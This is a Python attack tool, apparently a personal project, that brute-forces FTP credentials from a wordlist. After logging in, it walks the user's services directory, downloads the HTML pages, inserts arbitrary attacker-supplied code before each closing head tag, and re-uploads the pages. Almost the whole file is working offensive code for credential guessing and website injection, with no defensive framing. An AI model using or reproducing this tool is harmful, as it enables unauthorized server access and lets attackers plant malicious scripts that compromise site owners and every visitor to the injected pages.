#!/usr/bin/env python3
import ftplib
import asyncio
import os
import aiofiles
import colorama
import argparse
import time
import typing

# global var to settings
IP_ADDRESS: str = ""
REJECTEDS: int = 0
CODE_INJECTION: str = ""


def async_time(function: typing.Callable) -> typing.Callable[[tuple[typing.Any, ...]],
                                                             typing.Coroutine[typing.Any, typing.Any, typing.Any]]:
    async def wrapper(*args) -> typing.Any:
        s = time.time()
        result: typing.Any = await function(*args)
        print(colorama.Fore.YELLOW + f"[+] spend time: {time.time() - s} seconds.")
        return result

    return wrapper


async def parse() -> typing.Tuple[str, str]:
    """
    Try command line parsing
    :return: Tuple[str, str] (user, password)
    """
    global CODE_INJECTION
    parser = argparse.ArgumentParser(description="FTP code injection")
    parser.add_argument("-i", "--ip", default="localhost", type=str)
    parser.add_argument("-f", "--file", type=str, required=True)
    parser.add_argument("-c", "--code", type=str, required=True)
    parser = parser.parse_args()
    if not os.path.isfile(parser.file):
        raise FileNotFoundError("File does not exits.")
    if not parser.code:
        raise ValueError("Invalid code")
    CODE_INJECTION = parser.code
    return parser.ip, parser.file


async def read_file() -> typing.AsyncGenerator:
    """
    Read the dictionary [txt]
    :return: None
    """
    global IP_ADDRESS
    ip_address, file_name = await parse()
    IP_ADDRESS = ip_address
    async with aiofiles.open(file_name) as file:
        async for lines in file:
            yield lines


async def ftp_brute_force() -> None:
    """
    Read the dictionary and try to find the right credentials
    :return: None
    """
    print(colorama.Fore.GREEN + "[+] Testing credentials to connect ftp server...")
    async for line in read_file():
        response = await ftp_login(line)
        if response:
            user, password = line.split(':')
            print(colorama.Fore.GREEN + f"[+] Successfully connected")
            await get_pages_from_ftp_server(user, password)
        print(colorama.Fore.CYAN + f"{REJECTEDS} Wrong credentials", end='\r')


async def ftp_login(line: typing.AsyncGenerator) -> bool or typing.Tuple:
    """
    Login to ftp server
    :param line: Tuple[str] user, password
    :return: Tuple or bool
    """
    global REJECTEDS
    user, password = str(line).split(":")
    ftp = ftplib.FTP()
    try:
        ftp.connect(IP_ADDRESS, 21)
        ftp.login(user.strip(), password.strip())
    except ftplib.all_errors as e:
        REJECTEDS += 1
        ftp.close()
        return False
    else:
        return True


async def list_files(file: str, ftp: typing.Any) -> typing.Callable or str:
    """
    List files and identify html files, recursivily
    :param file: str
    :param ftp: instance
    :return: Callable or str
    """
    files = ftp.nlst(file)
    for f in files:
        if os.path.isdir(f):
            ftp.cwd(f)
            await list_files(f, ftp)
        else:
            if "htm" in os.path.splitext(f)[1]:
                await overwrite_page(f, ftp)


async def get_pages_from_ftp_server(user: str, password: str) -> None:
    """
    List the ftp server
    :param user: str
    :param password: str
    :return: None
    """
    ftp = ftplib.FTP()
    try:
        ftp.connect(IP_ADDRESS, 21)
        ftp.login(user.strip(), password.strip())
    except ftplib.all_errors as e:
        ftp.close()
        print(colorama.Fore.RED + f"[-]Error: {e}")
    else:
        files: typing.List[str] = ftp.nlst(f"/home/{user}/services/")
        print(colorama.Fore.BLUE + f"Founding files...")
        for file in files:
            await list_files(file, ftp)
    ftp.quit()


async def overwrite_page(path: str, ftp) -> None:
    """
    Overwrite the page (inject the code)
    :param path: str
    :param ftp: instance
    :return: None
    """
    content = ''
    with open(path + '.modify', 'wb') as temp:  # use 'wb' mode for binary files
        ftp.retrbinary(f"RETR {path}", temp.write)
    print(colorama.Fore.YELLOW + f"[=] Injecting code into {path}")
    with open(path + '.modify', 'r+') as temp:
        for line in temp.readlines():
            if "</head>" in line:
                line = line.replace("</head>", f"    {CODE_INJECTION}</head>")
            content += line
    with open(path + '.modify', 'w') as temp:
        temp.writelines(content)
    print(colorama.Fore.YELLOW + "[+] Code injected...")
    ftp.storbinary(f"STOR {path}", open(path + ".modify", "rb"))
    print(colorama.Fore.GREEN + "[+] Sending to server...")


@async_time
async def main() -> None:
    await ftp_brute_force()


if __name__ == '__main__':
    print(colorama.Fore.LIGHTMAGENTA_EX + """
    FTP INJECTION
    .∧＿∧
    ( ･ω･｡)つ━ ☠・☠。
    ⊂　 ノ 　　　・゜☠.
    しーＪ　　　°。☠ ☠´¨)
    　　　　　　　　　.· ´¸.·☠´¨) ¸.·☠¨)
    　　　　　　　　　　(¸.·´ (¸.·'☠ ☠By Marcus""")
    time.sleep(2)
    try:
        start = asyncio.get_event_loop()
        start.run_until_complete(main())
    except KeyboardInterrupt as e:
        print(colorama.Fore.RED + "Good Bye!")
